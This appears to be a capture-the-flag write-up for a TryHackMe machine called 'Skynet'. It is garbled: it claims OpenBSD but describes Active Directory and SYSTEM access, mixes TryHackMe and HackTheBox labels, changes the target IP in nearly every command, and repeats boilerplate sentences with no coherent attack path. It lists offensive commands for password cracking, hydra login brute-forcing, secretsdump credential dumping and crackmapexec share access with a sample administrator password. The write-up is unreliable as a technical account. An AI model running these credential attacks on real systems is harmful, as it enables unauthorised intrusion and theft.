---
TitleSEO: "TryHackMe — Skynet (Medium OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Skynet (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Skynet. Resource-Based Constrained Delegation and SeDebugPrivilege to achieve medium compromise on OpenBSD."
Keywords: "web, hackthebox, windows, active directory, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-skynet-827.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-skynet-827/"
Date: "2026-01-27"
Tags: "Web, HackTheBox, Windows, Active Directory, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-skynet-827"
Permalink: "/writeups/htb-skynet-827.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Skynet** is rated **Medium** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.90.243.27`.

### Objectives

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p80,464,27017 10.13.151.182 -oN scan.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.15.129.238/FUZZ
evil-winrm -i 10.23.76.249 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services.

### Web Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.45.59.215 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.73.187
```

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **Resource-Based Constrained Delegation**.

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```powershell
feroxbuster -h
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.203.63 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.80.12
crackmapexec smb 10.40.159.162 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.66.183.153 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `rpcclient`
- `mimikatz`
- `socat`
- `sharphound`
- `ligolo-ng`
- `chisel`

### Key Takeaways

- Resource-Based Constrained Delegation
- SeDebugPrivilege
- Command Injection
